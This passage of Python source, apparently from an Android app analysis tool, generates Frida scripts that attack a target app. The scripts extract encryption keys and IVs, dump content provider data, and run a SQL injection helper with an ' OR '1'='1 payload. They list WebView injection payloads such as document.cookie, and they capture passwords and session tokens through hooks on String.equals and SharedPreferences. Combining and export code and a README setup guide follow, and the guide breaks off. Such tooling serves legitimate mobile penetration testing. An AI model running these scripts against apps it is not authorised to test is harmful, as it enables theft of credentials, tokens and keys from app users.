        console.log('[-] PBEKeySpec hooks failed: ' + e);
    }}
    
    // ===== Cipher Operations =====
    try {{
        var Cipher = Java.use('javax.crypto.Cipher');
        
        Cipher.init.overload('int', 'java.security.Key', 'java.security.spec.AlgorithmParameterSpec').implementation = function(mode, key, params) {{
            var modeStr = mode === 1 ? 'ENCRYPT' : 'DECRYPT';
            console.log('\\n[CIPHER] init(' + modeStr + ')');
            console.log('  Algorithm: ' + key.getAlgorithm());
            console.log('  Key (hex): ' + bytesToHex(key.getEncoded()));
            
            if (params !== null && params.$className.indexOf('IvParameterSpec') !== -1) {{
                var IvParameterSpec = Java.use('javax.crypto.spec.IvParameterSpec');
                var ivSpec = Java.cast(params, IvParameterSpec);
                console.log('  IV (hex): ' + bytesToHex(ivSpec.getIV()));
            }}
            
            saveKey('key', key.getAlgorithm(), bytesToHex(key.getEncoded()), 'Cipher.init()');
            return this.init(mode, key, params);
        }};
        console.log('[*] Cipher hooks installed');
    }} catch (e) {{
        console.log('[-] Cipher hooks failed: ' + e);
    }}
    
    // ===== Summary Command =====
    global.dumpCryptoKeys = function() {{
        console.log('\\n');
        console.log('EXTRACTED KEYS: ' + extractedKeys.length);
        extractedKeys.forEach(function(k, i) {{
            console.log((i+1) + '. [' + k.algorithm + '] ' + k.hex.substring(0, 32) + '...');
        }});
        console.log('\\nEXTRACTED IVs: ' + extractedIVs.length);
        extractedIVs.forEach(function(iv, i) {{
            console.log((i+1) + '. ' + iv.hex);
        }});
        console.log('');
    }};
    
    console.log("\\n[*] Run 'dumpCryptoKeys()' in Frida REPL to see all captured keys");
    console.log("[*] Crypto Key Extraction Active");
}});
'''
        scripts.append({
            "name": "Crypto Key Extraction",
            "category": "crypto_exploit",
            "description": f"Extract encryption keys from {len(crypto_findings)} crypto vulnerabilities",
            "script_code": crypto_exploit_script,
            "target_classes": list(crypto_classes),
            "findings_count": len(crypto_findings),
            "usage_instructions": f"frida -U -f {package_name} -l crypto_extract.js --no-pause"
        })
    
    # =========================================================================
    # Generate Content Provider Attack Script
    # =========================================================================
    provider_findings = findings_by_scanner.get("content_provider_security", [])
    if provider_findings:
        provider_classes = set()
        for f in provider_findings:
            if f.get("class_name"):
                provider_classes.add(f["class_name"])
        
        provider_exploit_script = f'''// Content Provider Attack Script for {package_name}
// Generated based on {len(provider_findings)} content provider vulnerabilities
// Usage: frida -U -f {package_name} -l provider_attack.js --no-pause

Java.perform(function() {{
    console.log("");
    console.log("       Content Provider Attack Script                       ");
    console.log("       Vulnerabilities Found: {len(provider_findings):<3}                            ");
    console.log("");
    
    // ===== Monitor ContentResolver Queries =====
    try {{
        var ContentResolver = Java.use('android.content.ContentResolver');
        
        ContentResolver.query.overload(
            'android.net.Uri', '[Ljava.lang.String;', 'java.lang.String', 
            '[Ljava.lang.String;', 'java.lang.String'
        ).implementation = function(uri, projection, selection, selectionArgs, sortOrder) {{
            console.log('\\n[PROVIDER] ContentResolver.query()');
            console.log('  URI: ' + uri.toString());
            console.log('  Projection: ' + (projection ? projection.join(', ') : 'null'));
            console.log('  Selection: ' + selection);
            console.log('  Args: ' + (selectionArgs ? selectionArgs.join(', ') : 'null'));
            
            var cursor = this.query(uri, projection, selection, selectionArgs, sortOrder);
            
            if (cursor !== null) {{
                console.log('  Results: ' + cursor.getCount() + ' rows');
                
                // Dump column names
                var columns = cursor.getColumnNames();
                console.log('  Columns: ' + columns.join(', '));
                
                // Dump first few rows
                if (cursor.moveToFirst()) {{
                    var rowCount = 0;
                    do {{
                        if (rowCount++ >= 3) {{
                            console.log('  ... more rows ...');
                            break;
                        }}
                        var row = [];
                        for (var i = 0; i < columns.length && i < 5; i++) {{
                            try {{
                                row.push(columns[i] + '=' + cursor.getString(i));
                            }} catch(e) {{
                                row.push(columns[i] + '=[binary]');
                            }}
                        }}
                        console.log('  Row: ' + row.join(', '));
                    }} while (cursor.moveToNext());
                    cursor.moveToFirst(); // Reset cursor
                }}
            }}
            return cursor;
        }};
        
        console.log('[*] ContentResolver.query() hooks installed');
    }} catch (e) {{
        console.log('[-] ContentResolver hooks failed: ' + e);
    }}
    
    // ===== Monitor ContentProvider.openFile() =====
    try {{
        var ContentProvider = Java.use('android.content.ContentProvider');
        
        ContentProvider.openFile.overload('android.net.Uri', 'java.lang.String').implementation = function(uri, mode) {{
            console.log('\\n[PROVIDER] ContentProvider.openFile()');
            console.log('  URI: ' + uri.toString());
            console.log('  Mode: ' + mode);
            console.log('  [!] Potential path traversal point');
            
            return this.openFile(uri, mode);
        }};
        
        console.log('[*] ContentProvider.openFile() hooks installed');
    }} catch (e) {{
        console.log('[-] ContentProvider hooks failed: ' + e);
    }}
    
    // ===== SQL Injection Testing Helper =====
    global.testSQLi = function(uri, payload) {{
        console.log('\\n[SQLi TEST] Testing: ' + uri + ' with payload: ' + payload);
        try {{
            var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
            var resolver = context.getContentResolver();
            var Uri = Java.use('android.net.Uri');
            
            var cursor = resolver.query(Uri.parse(uri), null, payload, null, null);
            if (cursor !== null) {{
                console.log('[+] Query returned ' + cursor.getCount() + ' rows');
                cursor.close();
            }}
        }} catch (e) {{
            console.log('[-] Error: ' + e);
        }}
    }};
    
    // ===== Provider Enumeration =====
    global.enumProviders = function() {{
        console.log('\\n[ENUM] Enumerating content providers...');
        try {{
            var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
            var pm = context.getPackageManager();
            var providers = pm.queryContentProviders(null, 0, 0);
            
            if (providers !== null) {{
                for (var i = 0; i < providers.size(); i++) {{
                    var info = providers.get(i);
                    console.log('  content://' + info.authority);
                }}
            }}
        }} catch (e) {{
            console.log('[-] Enumeration failed: ' + e);
        }}
    }};
    
    console.log("\\n[*] Helper functions available:");
    console.log("  testSQLi('content://authority/path', \\\"' OR '1'='1\\\")");
    console.log("  enumProviders()");
    console.log("\\n[*] Content Provider Monitoring Active");
}});
'''
        scripts.append({
            "name": "Content Provider Attack",
            "category": "provider_exploit",
            "description": f"Attack {len(provider_findings)} content provider vulnerabilities",
            "script_code": provider_exploit_script,
            "target_classes": list(provider_classes),
            "findings_count": len(provider_findings),
            "usage_instructions": f"frida -U -f {package_name} -l provider_attack.js --no-pause"
        })
    
    # =========================================================================
    # Generate Kotlin Coroutine Monitor Script
    # =========================================================================
    kotlin_findings = findings_by_scanner.get("kotlin_security", [])
    if kotlin_findings:
        kotlin_classes = set()
        for f in kotlin_findings:
            if f.get("class_name"):
                kotlin_classes.add(f["class_name"])
        
        kotlin_monitor_script = f'''// Kotlin Coroutine & Security Monitor for {package_name}
// Generated based on {len(kotlin_findings)} Kotlin vulnerabilities
// Usage: frida -U -f {package_name} -l kotlin_monitor.js --no-pause

Java.perform(function() {{
    console.log("");
    console.log("       Kotlin Security Monitor                              ");
    console.log("       Vulnerabilities Found: {len(kotlin_findings):<3}                            ");
    console.log("");
    
    // ===== Monitor Coroutine Dispatchers =====
    try {{
        var Dispatchers = Java.use('kotlinx.coroutines.Dispatchers');
        console.log('[*] Dispatchers class loaded');
        
        // We can't easily hook Kotlin coroutines but we can monitor related classes
    }} catch (e) {{
        console.log('[-] Dispatchers not found (expected if no coroutines)');
    }}
    
    // ===== GlobalScope Monitoring =====
    try {{
        var GlobalScope = Java.use('kotlinx.coroutines.GlobalScope');
        console.log('[*] GlobalScope usage detected - potential resource leak');
    }} catch (e) {{}}
    
    // ===== runBlocking Detection =====
    try {{
        var BuildersKt = Java.use('kotlinx.coroutines.BuildersKt');
        // Monitor runBlocking calls that could cause ANR
        console.log('[*] Coroutine builders context established');
    }} catch (e) {{}}
    
    // ===== Kotlin Serialization Monitor =====
    try {{
        var Json = Java.use('kotlinx.serialization.json.Json');
        console.log('[*] Kotlin serialization detected');
        
        // Try to hook decodeFromString
        try {{
            var StringFormat = Java.use('kotlinx.serialization.StringFormat');
            console.log('[*] StringFormat available for serialization monitoring');
        }} catch (e2) {{}}
    }} catch (e) {{
        console.log('[-] Kotlin serialization not found');
    }}
    
    // ===== UninitializedPropertyAccessException Monitor =====
    try {{
        var UninitializedPropertyAccessException = Java.use('kotlin.UninitializedPropertyAccessException');
        console.log('[!] App uses lateinit - monitoring for uninitialized access');
    }} catch (e) {{}}
    
    // ===== Monitor Kotlin Reflection =====
    try {{
        var KClass = Java.use('kotlin.reflect.KClass');
        console.log('[*] Kotlin reflection usage detected');
    }} catch (e) {{}}
    
    // ===== SharedPreferences with Kotlin Extensions =====
    try {{
        var Editor = Java.use('android.content.SharedPreferences$Editor');
        
        Editor.putString.implementation = function(key, value) {{
            // Look for sensitive Kotlin-style naming
            if (key.match(/token|secret|password|key|credential|auth/i)) {{
                console.log('\\n[KOTLIN_PREFS] Sensitive data stored');
                console.log('  Key: ' + key);
                console.log('  Value: ' + (value ? value.substring(0, 50) + '...' : 'null'));
            }}
            return this.putString(key, value);
        }};
        
        console.log('[*] SharedPreferences monitoring installed');
    }} catch (e) {{
        console.log('[-] SharedPreferences hooks failed: ' + e);
    }}
    
    // ===== Cast Exception Monitor =====
    try {{
        var ClassCastException = Java.use('java.lang.ClassCastException');
        // Detect Kotlin unsafe cast failures
        console.log('[*] ClassCastException monitor ready');
    }} catch (e) {{}}
    
    console.log("\\n[*] Kotlin Security Monitoring Active");
    console.log("[*] Watching for: lateinit access, coroutine issues, serialization");
}});
'''
        scripts.append({
            "name": "Kotlin Security Monitor",
            "category": "kotlin_monitor",
            "description": f"Monitor {len(kotlin_findings)} Kotlin security issues",
            "script_code": kotlin_monitor_script,
            "target_classes": list(kotlin_classes),
            "findings_count": len(kotlin_findings),
            "usage_instructions": f"frida -U -f {package_name} -l kotlin_monitor.js --no-pause"
        })
    
    # =========================================================================
    # Generate WebView Exploitation Script
    # =========================================================================
    webview_findings = findings_by_scanner.get("webview_security", [])
    if webview_findings:
        webview_classes = set()
        js_interfaces = []
        for f in webview_findings:
            if f.get("class_name"):
                webview_classes.add(f["class_name"])
            if "JavascriptInterface" in f.get("title", "") or "addJavascriptInterface" in f.get("code_snippet", ""):
                js_interfaces.append(f)
        
        webview_exploit_script = f'''// WebView Exploitation Script for {package_name}
// Generated based on {len(webview_findings)} WebView vulnerabilities
// Usage: frida -U -f {package_name} -l webview_exploit.js --no-pause

Java.perform(function() {{
    console.log("");
    console.log("       WebView Exploitation Script                          ");
    console.log("       Vulnerabilities Found: {len(webview_findings):<3}                            ");
    console.log("       JS Interfaces: {len(js_interfaces):<3}                                   ");
    console.log("");
    
    var jsInterfaces = [];
    
    // ===== Monitor addJavascriptInterface =====
    try {{
        var WebView = Java.use('android.webkit.WebView');
        
        WebView.addJavascriptInterface.implementation = function(object, name) {{
            console.log('\\n[JSINTERFACE] addJavascriptInterface() called');
            console.log('  Interface Name: ' + name);
            console.log('  Object Class: ' + object.$className);
            
            // List methods on the interface
            try {{
                var methods = object.getClass().getDeclaredMethods();
                console.log('  Methods:');
                for (var i = 0; i < methods.length; i++) {{
                    var m = methods[i];
                    if (m.getAnnotation(Java.use('android.webkit.JavascriptInterface').class)) {{
                        console.log('    @JavascriptInterface ' + m.getName());
                    }}
                }}
            }} catch (e) {{}}
            
            jsInterfaces.push({{name: name, className: object.$className}});
            return this.addJavascriptInterface(object, name);
        }};
        
        console.log('[*] addJavascriptInterface hooks installed');
    }} catch (e) {{
        console.log('[-] addJavascriptInterface hook failed: ' + e);
    }}
    
    // ===== Monitor WebView Settings =====
    try {{
        var WebSettings = Java.use('android.webkit.WebSettings');
        
        WebSettings.setJavaScriptEnabled.implementation = function(enabled) {{
            console.log('[WEBVIEW] setJavaScriptEnabled(' + enabled + ')');
            return this.setJavaScriptEnabled(enabled);
        }};
        
        WebSettings.setAllowFileAccess.implementation = function(allowed) {{
            console.log('[WEBVIEW] setAllowFileAccess(' + allowed + ')');
            if (allowed) console.log('  [!] FILE ACCESS ENABLED');
            return this.setAllowFileAccess(allowed);
        }};
        
        WebSettings.setAllowFileAccessFromFileURLs.implementation = function(allowed) {{
            console.log('[WEBVIEW] setAllowFileAccessFromFileURLs(' + allowed + ')');
            if (allowed) console.log('  [!] CRITICAL: File URL file access enabled');
            return this.setAllowFileAccessFromFileURLs(allowed);
        }};
        
        WebSettings.setAllowUniversalAccessFromFileURLs.implementation = function(allowed) {{
            console.log('[WEBVIEW] setAllowUniversalAccessFromFileURLs(' + allowed + ')');
            if (allowed) console.log('  [!] CRITICAL: Universal file access enabled');
            return this.setAllowUniversalAccessFromFileURLs(allowed);
        }};
        
        console.log('[*] WebSettings hooks installed');
    }} catch (e) {{
        console.log('[-] WebSettings hooks failed: ' + e);
    }}
    
    // ===== Monitor loadUrl =====
    try {{
        var WebView = Java.use('android.webkit.WebView');
        
        WebView.loadUrl.overload('java.lang.String').implementation = function(url) {{
            console.log('\\n[WEBVIEW] loadUrl("' + url + '")');
            
            if (url.startsWith('javascript:')) {{
                console.log('  [JS] JavaScript execution via loadUrl');
            }}
            if (url.startsWith('file://')) {{
                console.log('  [!] Loading local file');
            }}
            
            return this.loadUrl(url);
        }};
        
        WebView.evaluateJavascript.implementation = function(script, callback) {{
            console.log('\\n[WEBVIEW] evaluateJavascript()');
            console.log('  Script: ' + script.substring(0, 200) + (script.length > 200 ? '...' : ''));
            return this.evaluateJavascript(script, callback);
        }};
        
        console.log('[*] WebView.loadUrl() hooks installed');
    }} catch (e) {{
        console.log('[-] WebView hooks failed: ' + e);
    }}
    
    // ===== SSL Error Handler =====
    try {{
        var WebViewClient = Java.use('android.webkit.WebViewClient');
        WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {{
            console.log('\\n[WEBVIEW] onReceivedSslError()');
            console.log('  URL: ' + error.getUrl());
            console.log('  Error: ' + error.toString());
            console.log('  [!] Check if handler.proceed() is called');
            
            return this.onReceivedSslError(view, handler, error);
        }};
        console.log('[*] SSL error handler monitoring installed');
    }} catch (e) {{}}
    
    // ===== Helper to list interfaces =====
    global.listJsInterfaces = function() {{
        console.log('\\n[JS INTERFACES FOUND]');
        jsInterfaces.forEach(function(i, idx) {{
            console.log((idx+1) + '. ' + i.name + ' -> ' + i.className);
        }});
    }};
    
    // ===== Exploit helper =====
    global.injectJs = function(js) {{
        console.log('\\n[*] To inject JavaScript, find a WebView reference and call:');
        console.log('    webview.loadUrl("javascript:" + js)');
        console.log('\\n[*] Common payloads:');
        console.log('    document.cookie');
        console.log('    Android.getClass().forName("java.lang.Runtime")...');
    }};
    
    console.log("\\n[*] Run 'listJsInterfaces()' to see captured JS interfaces");
    console.log("[*] WebView Exploitation Monitoring Active");
}});
'''
        scripts.append({
            "name": "WebView Exploitation",
            "category": "webview_exploit",
            "description": f"Exploit {len(webview_findings)} WebView vulnerabilities, {len(js_interfaces)} JS interfaces",
            "script_code": webview_exploit_script,
            "target_classes": list(webview_classes),
            "findings_count": len(webview_findings),
            "usage_instructions": f"frida -U -f {package_name} -l webview_exploit.js --no-pause"
        })
    
    # =========================================================================
    # Generate Authentication Bypass Script
    # =========================================================================
    auth_findings = findings_by_scanner.get("authentication", [])
    if auth_findings:
        auth_classes = set()
        for f in auth_findings:
            if f.get("class_name"):
                auth_classes.add(f["class_name"])
        
        auth_bypass_script = f'''// Authentication Bypass Script for {package_name}
// Generated based on {len(auth_findings)} authentication vulnerabilities
// Usage: frida -U -f {package_name} -l auth_bypass.js --no-pause

Java.perform(function() {{
    console.log("");
    console.log("       Authentication Bypass Script                         ");
    console.log("       Vulnerabilities Found: {len(auth_findings):<3}                            ");
    console.log("");
    
    var capturedCredentials = [];
    var capturedTokens = [];
    
    // ===== SharedPreferences Token Capture & Modify =====
    try {{
        var SharedPreferences = Java.use('android.content.SharedPreferences');
        var Editor = Java.use('android.content.SharedPreferences$Editor');
        
        SharedPreferences.getString.overload('java.lang.String', 'java.lang.String').implementation = function(key, defValue) {{
            var value = this.getString(key, defValue);
            
            if (key.toLowerCase().match(/token|session|auth|jwt|cookie|bearer|credential|password/)) {{
                console.log('\\n[AUTH_READ] SharedPreferences.getString()');
                console.log('  Key: ' + key);
                console.log('  Value: ' + (value ? value.substring(0, 100) : 'null'));
                
                capturedTokens.push({{key: key, value: value, timestamp: new Date().toISOString()}});
            }}
            return value;
        }};
        
        Editor.putString.implementation = function(key, value) {{
            if (key.toLowerCase().match(/token|session|auth|jwt|cookie|bearer|credential|password/)) {{
                console.log('\\n[AUTH_WRITE] SharedPreferences.putString()');
                console.log('  Key: ' + key);
                console.log('  Value: ' + (value ? value.substring(0, 100) : 'null'));
                
                capturedTokens.push({{key: key, value: value, timestamp: new Date().toISOString()}});
            }}
            return this.putString(key, value);
        }};
        
        console.log('[*] SharedPreferences auth monitoring installed');
    }} catch (e) {{
        console.log('[-] SharedPreferences hooks failed: ' + e);
    }}
    
    // ===== String.equals() for Password Comparison =====
    try {{
        var String = Java.use('java.lang.String');
        
        String.equals.implementation = function(other) {{
            var result = this.equals(other);
            
            // Check if this looks like a password check
            var thisStr = this.toString();
            var otherStr = other ? other.toString() : 'null';
            
            if (thisStr.length > 4 && thisStr.length < 64 && otherStr.length > 4 && otherStr.length < 64) {{
                // Could be password/PIN comparison
                var stack = Java.use('java.lang.Thread').currentThread().getStackTrace();
                for (var i = 0; i < Math.min(5, stack.length); i++) {{
                    var frame = stack[i].toString();
                    if (frame.toLowerCase().match(/password|pin|auth|login|verify|check|valid/)) {{
                        console.log('\\n[AUTH_CHECK] String.equals() in auth context');
                        console.log('  Expected: ' + thisStr);
                        console.log('  Provided: ' + otherStr);
                        console.log('  Result: ' + result);
                        console.log('  Stack: ' + frame);
                        
                        capturedCredentials.push({{expected: thisStr, provided: otherStr, result: result}});
                        break;
                    }}
                }}
            }}
            return result;
        }};
        
        console.log('[*] String.equals() password capture installed');
    }} catch (e) {{
        console.log('[-] String.equals() hook failed: ' + e);
    }}
    
    // ===== Biometric Bypass =====
    try {{
        var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
        BiometricPrompt.onAuthenticationSucceeded.implementation = function(result) {{
            console.log('\\n[BIOMETRIC] Authentication succeeded');
            return this.onAuthenticationSucceeded(result);
        }};
        
        BiometricPrompt.onAuthenticationFailed.implementation = function() {{
            console.log('\\n[BIOMETRIC] Authentication failed - consider bypassing');
            return this.onAuthenticationFailed();
        }};
        
        console.log('[*] BiometricPrompt monitoring installed');
    }} catch (e) {{
        console.log('[-] BiometricPrompt not found');
    }}
    
    // ===== Bypass Helper Functions =====
    global.bypassPinCheck = function(correctPin) {{
        console.log('[*] Installing PIN bypass returning: ' + correctPin);
        // This would need to hook specific app methods
    }};
    
    global.dumpCredentials = function() {{
        console.log('\\n');
        console.log('CAPTURED CREDENTIALS: ' + capturedCredentials.length);
        capturedCredentials.forEach(function(c, i) {{
            console.log((i+1) + '. Expected="' + c.expected + '" Provided="' + c.provided + '" Match=' + c.result);
        }});
        console.log('\\nCAPTURED TOKENS: ' + capturedTokens.length);
        capturedTokens.forEach(function(t, i) {{
            console.log((i+1) + '. ' + t.key + ' = ' + (t.value ? t.value.substring(0, 50) : 'null') + '...');
        }});
        console.log('');
    }};
    
    console.log("\\n[*] Run 'dumpCredentials()' to see captured auth data");
    console.log("[*] Authentication Monitoring Active");
}});
'''
        scripts.append({
            "name": "Authentication Bypass",
            "category": "auth_bypass",
            "description": f"Bypass {len(auth_findings)} authentication vulnerabilities",
            "script_code": auth_bypass_script,
            "target_classes": list(auth_classes),
            "findings_count": len(auth_findings),
            "usage_instructions": f"frida -U -f {package_name} -l auth_bypass.js --no-pause"
        })
    
    return {
        "package_name": package_name,
        "vulnerability_scripts": scripts,
        "total_targeted_hooks": len(scripts),
        "findings_analyzed": len(decompiled_findings),
        "findings_by_scanner": {k: len(v) for k, v in findings_by_scanner.items()},
    }


# ============================================================================
# Frida Script Combiner & Export
# ============================================================================

def combine_frida_scripts(
    package_name: str,
    scripts: List[Dict[str, Any]],
    selected_categories: Optional[List[str]] = None,
    include_vulnerability_scripts: bool = True,
    vuln_scripts: Optional[List[Dict[str, Any]]] = None
) -> Dict[str, Any]:
    """
    Combine multiple Frida scripts into a single all-in-one script.
    
    Args:
        package_name: Target app package name
        scripts: List of standard Frida scripts from generate_frida_scripts()
        selected_categories: Optional list of categories to include (None = all)
        include_vulnerability_scripts: Whether to include vulnerability-specific scripts
        vuln_scripts: Vulnerability-specific scripts from generate_vulnerability_specific_frida_hooks()
    
    Returns:
        Dict with combined script and metadata
    """
    from datetime import datetime
    
    all_scripts = []
    included_categories = []
    total_hooks = 0
    
    # Filter standard scripts by category
    for script in scripts:
        category = script.get("category", "")
        if selected_categories is None or category in selected_categories:
            all_scripts.append(script)
            included_categories.append(category)
            total_hooks += len(script.get("target_methods", []))
    
    # Add vulnerability scripts if requested
    if include_vulnerability_scripts and vuln_scripts:
        for script in vuln_scripts:
            all_scripts.append(script)
            included_categories.append(script.get("category", "vuln"))
            total_hooks += script.get("findings_count", 0)
    
    if not all_scripts:
        return {
            "success": False,
            "error": "No scripts selected for combination",
            "combined_script": None
        }
    
    # Build combined script header
    generation_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    script_list = ", ".join(s.get("name", "Unknown") for s in all_scripts)
    
    combined_header = f'''// 
//                     VRAgent Combined Frida Script                          
//                     Target: {package_name[:45]:<45} 
//                     Generated: {generation_time:<36} 
// 
//   Scripts Included ({len(all_scripts)} total):
//     {script_list[:68]}
//   Total Hook Points: {total_hooks}
// 
//   Usage: frida -U -f {package_name} -l combined_hooks.js --no-pause
//   Or:    frida -U {package_name} -l combined_hooks.js
// 

// Global state for combined script
var __vragent_state = {{
    package_name: "{package_name}",
    scripts_loaded: [],
    errors: [],
    start_time: new Date()
}};

function __vragent_log(category, message) {{
    console.log('[' + category.toUpperCase() + '] ' + message);
}}

function __vragent_error(category, error) {{
    console.log('[ERROR:' + category + '] ' + error);
    __vragent_state.errors.push({{category: category, error: String(error)}});
}}

'''

    # Build script sections
    script_sections = []
    
    for i, script in enumerate(all_scripts):
        script_name = script.get("name", f"Script {i+1}")
        script_category = script.get("category", "unknown")
        script_code = script.get("script_code", "")
        
        # Strip the Java.perform wrapper from individual scripts to combine them
        # We'll wrap everything in a single Java.perform at the end
        
        # Create section header
        section_header = f'''
// 
// SECTION {i+1}: {script_name}
// Category: {script_category}
// 
__vragent_state.scripts_loaded.push("{script_name}");
__vragent_log("{script_category}", "Loading {script_name}...");

try {{
'''
        
        # Extract the inner content from Java.perform
        inner_code = script_code
        
        # Simple extraction - find Java.perform and get its content
        if "Java.perform(function()" in inner_code:
            # Find the opening of Java.perform
            start_idx = inner_code.find("Java.perform(function()")
            if start_idx != -1:
                # Skip to after the opening brace
                brace_idx = inner_code.find("{", start_idx + 20)
                if brace_idx != -1:
                    # Find matching closing - simple approach: remove first { and last });
                    inner_code = inner_code[brace_idx + 1:]
                    # Remove closing });
                    last_close = inner_code.rfind("});")
                    if last_close != -1:
                        inner_code = inner_code[:last_close]
        
        # Also handle scripts that start with console.log before Java.perform
        # Keep native-level code outside Java.perform
        native_code = ""
        java_code = inner_code
        
        if "Java.perform" not in script_code and ("Interceptor.attach" in script_code or "Module.find" in script_code):
            # This is a native-level script
            native_code = inner_code
            java_code = ""
        
        section_footer = f'''
    __vragent_log("{script_category}", "{script_name} loaded successfully");
}} catch (e) {{
    __vragent_error("{script_category}", e);
}}
'''
        
        script_sections.append({
            "header": section_header,
            "native_code": native_code,
            "java_code": java_code,
            "footer": section_footer
        })
    
    # Combine native code (runs outside Java.perform)
    native_parts = []
    for section in script_sections:
        if section["native_code"].strip():
            native_parts.append(section["header"])
            native_parts.append(section["native_code"])
            native_parts.append(section["footer"])
    
    native_combined = "\\n".join(native_parts) if native_parts else ""
    
    # Combine Java code
    java_parts = []
    for section in script_sections:
        if section["java_code"].strip():
            java_parts.append(section["header"])
            java_parts.append(section["java_code"])
            java_parts.append(section["footer"])
    
    java_combined = "\\n".join(java_parts) if java_parts else ""
    
    # Build final combined script
    combined_script = combined_header
    
    if native_combined:
        combined_script += '''
// 
//                     NATIVE-LEVEL HOOKS (Outside Java VM)                   
// 

'''
        combined_script += native_combined
    
    combined_script += '''

// 
//                     JAVA-LEVEL HOOKS                                       
// 

Java.perform(function() {
    console.log("\\n[VRAGENT] Combined Script Starting...");
    console.log("[VRAGENT] Target: ''' + package_name + '''");
    console.log("[VRAGENT] Scripts: ''' + str(len(all_scripts)) + '''");
    
'''
    
    combined_script += java_combined
    
    combined_script += '''
    
    // 
    // COMBINED SCRIPT SUMMARY
    // 
    console.log("\\n");
    console.log("         VRAGENT COMBINED SCRIPT LOADED                       ");
    console.log("");
    console.log("  Scripts: " + __vragent_state.scripts_loaded.length);
    console.log("  Errors: " + __vragent_state.errors.length);
    console.log("");
    
    if (__vragent_state.errors.length > 0) {
        console.log("\\n[!] Errors encountered:");
        __vragent_state.errors.forEach(function(e) {
            console.log("  - " + e.category + ": " + e.error);
        });
    }
    
    // Helper function to show status
    global.vragentStatus = function() {
        console.log("\\nVRAgent Combined Script Status:");
        console.log("  Package: " + __vragent_state.package_name);
        console.log("  Scripts loaded: " + __vragent_state.scripts_loaded.join(", "));
        console.log("  Errors: " + __vragent_state.errors.length);
        console.log("  Uptime: " + ((new Date() - __vragent_state.start_time) / 1000) + "s");
    };
    
    console.log("\\n[*] Run 'vragentStatus()' in REPL for status");
    console.log("[*] Combined Script Ready!\\n");
});
'''
    
    return {
        "success": True,
        "package_name": package_name,
        "combined_script": combined_script,
        "scripts_included": [s.get("name") for s in all_scripts],
        "categories_included": list(set(included_categories)),
        "total_scripts": len(all_scripts),
        "total_hooks": total_hooks,
        "generation_time": generation_time,
        "usage_command": f"frida -U -f {package_name} -l combined_hooks.js --no-pause",
        "file_suggestion": "combined_hooks.js"
    }


def export_frida_scripts_to_files(
    package_name: str,
    scripts: List[Dict[str, Any]],
    output_dir: Optional[str] = None,
    include_combined: bool = True,
    vuln_scripts: Optional[List[Dict[str, Any]]] = None
) -> Dict[str, Any]:
    """
    Export Frida scripts to individual files and optionally a combined script.
    
    Returns metadata about exported files (for download or file system storage).
    """
    from datetime import datetime
    import re
    
    exported_files = []
    
    def sanitize_filename(name: str) -> str:
        """Convert script name to valid filename."""
        # Remove special characters, replace spaces with underscores
        clean = re.sub(r'[^a-zA-Z0-9_\-]', '', name.replace(' ', '_').replace('/', '_'))
        return clean.lower() + '.js'
    
    # Export individual scripts
    for script in scripts:
        script_name = script.get("name", "unknown")
        script_code = script.get("script_code", "")
        category = script.get("category", "misc")
        
        filename = sanitize_filename(script_name)
        
        exported_files.append({
            "filename": filename,
            "category": category,
            "script_name": script_name,
            "content": script_code,
            "size_bytes": len(script_code.encode('utf-8')),
            "usage": script.get("usage_instructions", f"frida -U -f {package_name} -l {filename} --no-pause")
        })
    
    # Export vulnerability scripts if provided
    if vuln_scripts:
        for script in vuln_scripts:
            script_name = script.get("name", "vuln_unknown")
            script_code = script.get("script_code", "")
            category = script.get("category", "vuln")
            
            filename = "vuln_" + sanitize_filename(script_name)
            
            exported_files.append({
                "filename": filename,
                "category": category,
                "script_name": script_name,
                "content": script_code,
                "size_bytes": len(script_code.encode('utf-8')),
                "usage": script.get("usage_instructions", f"frida -U -f {package_name} -l {filename} --no-pause")
            })
    
    # Generate combined script if requested
    combined_file = None
    if include_combined:
        combined_result = combine_frida_scripts(
            package_name=package_name,
            scripts=scripts,
            include_vulnerability_scripts=bool(vuln_scripts),
            vuln_scripts=vuln_scripts
        )
        
        if combined_result.get("success"):
            combined_file = {
                "filename": "combined_hooks.js",
                "category": "combined",
                "script_name": "Combined All-in-One Script",
                "content": combined_result["combined_script"],
                "size_bytes": len(combined_result["combined_script"].encode('utf-8')),
                "usage": combined_result["usage_command"],
                "scripts_included": combined_result["scripts_included"]
            }
            exported_files.append(combined_file)
    
    # Generate README
    readme_content = f"""# Frida Scripts for {package_name}
Generated by VRAgent APK Analyzer
Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

---

##  Table of Contents
1. [What is Frida?](#what-is-frida)
2. [Prerequisites](#prerequisites)
3. [Installation Guide](#installation-guide)
4. [Device Setup](#device-setup)
5. [Running Scripts](#running-scripts)
6. [Scripts Included](#scripts-included)
7. [Troubleshooting](#troubleshooting)
8. [Advanced Usage](#advanced-usage)

---

##  What is Frida?

Frida is a dynamic instrumentation toolkit that lets you inject JavaScript into running applications. 
For Android security testing, it allows you to:
- Bypass SSL pinning to intercept HTTPS traffic
- Bypass root detection to test on rooted devices
- Monitor cryptographic operations and extract keys
- Hook authentication functions
- Trace method calls and inspect data

---

##  Prerequisites

Before using these scripts, you need:

1. **A Computer** (Windows, macOS, or Linux)
2. **Python 3.7+** installed
3. **An Android Device** (physical or emulator)
   - For physical devices: USB debugging enabled
   - Rooted device recommended (Magisk or similar)
4. **ADB (Android Debug Bridge)** installed
5. **The target APK** installed on your device

---

##  Installation Guide

### Step 1: Install Python (if not installed)

**Windows:**
- Download from https://www.python.org/downloads/
- During install, CHECK "Add Python to PATH"

**macOS:**
```bash
brew install python3
```

**Linux (Ubuntu/Debian):**
```bash
sudo apt update
sudo apt install python3 python3-pip
```

### Step 2: Install Frida Tools

Open a terminal/command prompt and run:

```bash
pip install frida-tools
```

Verify installation:
```bash
frida --version
```

You should see something like: `16.x.x`

### Step 3: Install ADB

**Windows:**
- Download Android SDK Platform Tools from:
  https://developer.android.com/studio/releases/platform-tools
- Extract to a folder (e.g., `C:\\platform-tools`)
- Add to PATH environment variable

**macOS:**
```bash
brew install android-platform-tools
```

**Linux:**
```bash
sudo apt install adb
```

Verify:
```bash
adb version
```

---

##  Device Setup

### For Physical Android Devices

#### 1. Enable Developer Options
- Go to **Settings > About Phone**
- Tap **Build Number** 7 times
- You'll see "You are now a developer!"

#### 2. Enable USB Debugging
